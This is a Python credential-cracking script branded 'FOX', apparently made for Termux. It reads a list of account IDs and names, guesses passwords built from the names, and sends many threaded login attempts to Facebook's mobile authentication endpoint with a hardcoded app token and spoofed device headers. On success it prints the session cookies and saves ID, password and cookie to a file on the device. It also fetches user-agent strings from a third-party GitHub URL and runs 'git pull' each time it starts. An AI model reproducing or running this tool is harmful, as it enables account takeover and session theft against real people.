#-*-coding:utf-8-*-
#!/usr/bin/python3
#!/coding by Mahadi x Sefat
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as M4H4D1
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('git pull');os.system('termux-setup-storage -y')
try:
    import requests
except ImportError:
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    os.system('pip install bs4')
    
#------------------[ ID DATE ]-------------------#
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\033[1;31m"
green="\033[1;32m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []

#os.system('xdg-open https://github.com/SEFAT-MAHADI') 
logox=(f"""
\033[0;37m╔━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━╗
\033[0;37m┃ ███████  ██████  ██   ██ ┃ \033[0;36m• \033[38;5;46mOWNER : FOX\033[0;37m  ┃
\033[0;37m┃ ██      ██    ██  ██ ██  ┃ \033[0;36m• \033[38;5;46mTOOL  : FOX\033[0;37m  ┃
\033[0;37m┃ █████   ██    ██   ███   ┃ \033[0;36m• \033[38;5;46mSTATUS: PAID\033[0;37m ┃
\033[0;37m┃ ██      ██    ██  ██ ██  ┃ \033[0;36m• \033[38;5;46mVSN   : 1.0\033[0;37m  ┃
\033[0;37m┃ ██       ██████  ██   ██ ┃ \033[0;36m• \033[38;5;46mRANK  : 4X\033[0;37m   ┃
\033[0;37m╚━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━╝
    """)
def logo():
    os.system('clear')
    print(logox)

def linex():
        print(f"\033[0;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") 
def foxF():
    global oks,cps
    os.system('clear');logo()
    dfile = input("\033[0;36m(×)-\033[38;5;46mENTER FILE: ")
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);foxF()
    dplist = []
    try:
        os.system('clear');logo()
        pass_lmit = int(input('\033[0;36m(×)-\033[38;5;46mPASSWORD LIMIT : '))
    except:
        pass_lmit =1
    for i in range(pass_lmit):
        dplist.append(input(f'\033[0;36m(×)-\033[38;5;46mPASSWORD NO.{i+1} : '))
    with ThreadPool(max_workers=30) as Mahadi:
        os.system('clear');logo();total_ids = str(len(dx))
        print(f'\033[0;36m(×)-\033[38;5;46mTOTAL ACCOUNT : '+total_ids)
        print(f'\033[0;36m(×)-\033[38;5;46mIF NO RESULT USE AIRPLANE MODE')
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            Mahadi.submit(FoXCRK,ids,names,passlist)
    linex()
    print("\033[0;36m(×)-\033[38;5;46mTHE CRACKING IS COMPLETED")
    print('\033[0;36m(×)-\033[38;5;46mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    sys.exit()

get_ua_list = requests.get("https://raw.githubusercontent.com/Peaky-XD/X-SERVER/main/dav.txt").text.splitlines()

def FoXCRK(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[38;5;46m%s | OK:-%s \033[38;5;46m'%(loop,len(oks)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            adid = str(uuid.uuid4())
            data = {
                'adid':adid,
                'format':'json',
                'device_id':adid,
                'email':ids,
                'password':pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                "locale":"en_US","client_country_code":"US", 'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={
                'Authorization':f'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-FB-device-group': str(random.randint(2000, 4000)),
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'X-FB-connection-quality':'EXCELLENT',
                "X-Tigon-Is-Retry": "False",
                'User-Agent':random.choice(get_ua_list),
                "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                'X-FB-HTTP-Engine': 'Liger',
                }
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).text
            load = json.loads(po)
            if 'session_key' in load:
                kuki = ";".join(i["name"]+"="+i["value"] for i in load["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={sb};{kuki}"
                ids=str(load['uid'])
                print('\r\r\033[38;5;46m[FOX] '+ids+' | '+pas)
                print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
                linex()
                oks.append(ids)
                open('/sdcard/FoXF-OK.txt','a').write(f"{ids}|{pas}|{cookie}")
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

     
foxF()